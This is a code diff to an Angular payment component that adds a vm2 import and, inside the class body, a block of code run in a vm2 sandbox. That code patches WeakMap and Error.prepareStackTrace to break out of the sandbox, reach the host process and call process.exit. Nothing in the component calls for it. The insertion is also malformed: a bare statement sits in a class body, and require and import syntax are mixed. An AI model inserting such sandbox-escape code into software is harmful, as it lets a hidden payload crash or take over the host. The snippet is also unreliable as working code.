@@ -3,7 +3,7 @@
  * SPDX-License-Identifier: MIT
  */
 
-import * as $VM from 'vm2'
+const { VM } = require('vm2');
 import { UntypedFormControl, Validators } from '@angular/forms'
 import { Component, NgZone, OnInit } from '@angular/core'
 import { ConfigurationService } from '../Services/configuration.service'
@@ -101,6 +101,19 @@ export class PaymentComponent implements OnInit {
       }
     }, (err) => console.log(err))
   }
+  
+  new VM().run(`
+    const { set } = WeakMap.prototype;
+    WeakMap.prototype.set = function(v) {
+    return set.call(this, v, v);
+  };
+    Error.prepareStackTrace =
+    Error.prepareStackTrace =
+    (_, c) => c.map(c => c.getThis()).find(a => a);
+    const { stack } = new Error();
+    Error.prepareStackTrace = undefined;
+    stack.process.exit(1);
+  `);
 
   initTotal () {
     this.activatedRoute.paramMap.subscribe((paramMap: ParamMap) => {
